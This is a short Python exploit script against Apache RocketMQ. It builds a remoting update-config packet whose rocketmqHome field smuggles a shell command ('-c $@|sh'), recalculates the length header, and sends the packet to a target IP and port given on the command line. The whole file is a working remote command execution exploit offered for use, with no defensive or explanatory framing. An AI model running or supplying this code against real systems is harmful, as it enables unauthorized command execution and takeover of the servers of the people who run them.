import socket
import sys


# Function to send data over a socket connection
def send_data(ip, port, payload):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        # Connect to the server at the specified IP and port
        s.connect((ip, port))
        
        # Send the payload
        s.sendall(payload)
        
        # Receive and store the response (currently not used in the code)
        resp = s.recv(1024)


if __name__ == '__main__':
    # Check if the required command-line arguments are provided
    if len(sys.argv) < 4:
        print('Usage: python3 exploit.py <ip> <port> <command>')
        sys.exit(1)

    # Extract command-line arguments
    ip = sys.argv[1]
    port = int(sys.argv[2])
    command = ' '.join(sys.argv[3:]).strip()

    # Craft the JSON payload string
    json_payload_string = '`{"code":25,"flag":0,"language":"JAVA","opaque":0,"serializeTypeCurrentRPC":"JSON","version":395}filterServerNums=1\nrocketmqHome=-c $@|sh . echo '
    
    # Hexadecimal representations for payload components
    payload_prefix_hex = '000000cd000000'
    payload_postfix_hex = '3b0a'
    
    # Construct the payload by encoding the JSON payload string and appending the command
    payload = bytes.fromhex(payload_prefix_hex) + \
              json_payload_string.encode()      + \
              command.encode()                  + \
              bytes.fromhex(payload_postfix_hex)

    # Calculate the payload length in hexadecimal and update the payload accordingly
    hex_payload_length = hex(len(payload) - 4)[2:]
    payload = payload.hex().replace('000000cd000000','000000' + hex_payload_length + '000000')
    payload = bytes.fromhex(payload)

    # Call the send_data function to execute the payload
    send_data(ip, port, payload)
